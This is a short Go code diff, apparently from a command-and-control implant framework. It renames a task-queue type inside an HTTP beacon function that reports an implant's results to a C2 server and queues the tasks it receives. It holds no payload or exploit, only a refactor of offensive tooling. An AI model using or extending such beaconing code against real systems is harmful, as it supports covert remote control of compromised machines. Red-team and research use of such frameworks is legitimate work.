@@ -78,8 +78,8 @@ type BeaconPayload struct {
 	Results   []task.Result `json:"results"`
 }
 
-// Beacon sends results and returns the next TaskQueue
-func (h *HTTPSC2Communicator) Beacon(implantID uint, results []task.Result) (*task.TaskQueue, error) {
+// Beacon sends results and returns the next Queue
+func (h *HTTPSC2Communicator) Beacon(implantID uint, results []task.Result) (*task.Queue, error) {
 	// 1. Marshal results
 	payload := BeaconPayload{
 		ImplantID: implantID, // TODO: fix so that it uses JWT so its more secure
@@ -114,7 +114,7 @@ func (h *HTTPSC2Communicator) Beacon(implantID uint, results []task.Result) (*ta
 	}
 
 	// 5. Enqueue tasks
-	tq := task.NewTaskQueue()
+	tq := task.NewQueue()
 	for _, t := range c2Tasks {
 		switch t.TaskType {
 		case "Ping":
